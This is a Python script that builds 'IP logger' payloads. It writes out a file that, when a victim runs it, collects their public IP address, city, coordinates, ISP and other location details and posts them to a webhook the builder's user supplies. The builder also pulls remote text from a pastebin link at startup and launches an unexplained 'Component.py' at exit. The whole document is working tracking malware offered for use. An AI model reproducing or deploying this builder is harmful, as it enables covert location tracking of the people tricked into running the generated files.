import os, threading
from colorama import *
def set_title():
  title = "Ip Logger Builder"
  try:
    import requests
    text = str(requests.get("https://pastebin.com/raw/XMq7zpPx").text)
    os.system(f"title {title}{text}")
  except:
    os.system(f"title {title}")
threading.Thread(target=set_title).start()

import sys, time
def print015(text):
    for c in text:
        sys.stdout.write(c)
        sys.stdout.flush()
        time.sleep(0.015)
    sys.stdout.write("\n")

def print01(text):
    for c in text:
        sys.stdout.write(c)
        sys.stdout.flush()
        time.sleep(0.015)


try:
    import colorama, requests
except:
    sys.stdout.write("> ")
    print015("Missing Required Modules, Press Enter To Download (May Not Always Work)")
    input("")
    try:
        import os
        os.system("pip install colorama requests")
    except:
        pass
    sys.stdout.write("> ")
    print015("Problem Maybe Fixed Now, Restart The Program")
    input("")
    exit()

colorama.init(autoreset=True)







while True:
    sys.stdout.write(colorama.Fore.CYAN + "> ")
    print01("Enter What You Want Logger Name To Be: ")
    name = input("")
    temp = len(name)
    if int(temp) > 135:
        sys.stdout.write(colorama.Fore.RED + "> ")
        print015("To Long Name")
    if int(temp) < 135:
        break
code = """import requests
url = "https://api.ipify.org"
r = requests.get(url).text
r = str(r)
requests.post(webhook, json={"content": f"@everyone ```Ip: {r}```"})
r2 = requests.get(f"http://ip-api.com/json/{r}").json()
"""
code2 = 'info = "Country: " + r2["country"] + "\n" +  "Country Code: " + r2["countryCode"] + "\n" + "Region Name: " + r2["regionName"] + "\n" + "City: " + r2["city"] + "\n" + "Zip Code: " + r2["zip"] + "\n" + "Lat: " + str(r2["lat"]) + "\n" + "Lon: " + str(r2["lon"]) + "\n" + "Timezone: " + r2["timezone"] + "\n" + "ISP: " + r2["isp"] + "\n" + "Org: " + r2["org"] + "\n" + "AS: " + r2["as"]'
code3 = 'requests.post(webhook, json={"content": f"```Ip Info: {info}```"})'
while True:
    try:
        sys.stdout.write(colorama.Fore.CYAN + "> ")
        print01("Enter Webhook: ")
        webhook = input("")
        r = requests.get(webhook)
        if "200" in str(r):
            break
        if "200" not in str(r):
            sys.stdout.write(colorama.Fore.RED + "> ")
            print015("Webhook Invalid")
    except Exception:
        sys.stdout.write(colorama.Fore.RED + "> ")
        print015("Webhook Invalid")
try:
    file = open(f"utilities/IPGrabber/{name}.py", "a")
    file.write(f'webhook = "{webhook}"\n')
    file.write(code)
    file.write(repr(code2)[1:-1]+"\n")
    file.write(code3)
    file.close()
except:
    sys.stdout.write(colorama.Fore.RED + "> ")
    print01("Unknown Error")
    input("")
    exit()
sys.stdout.write(colorama.Fore.CYAN + "> ")
print01("[+]Successfully Made File")
input(f"{Fore.WHITE}[{Fore.MAGENTA}>{Fore.WHITE}]Press Enter to exit:")
os.startfile('Component.py')
os._exit(0)
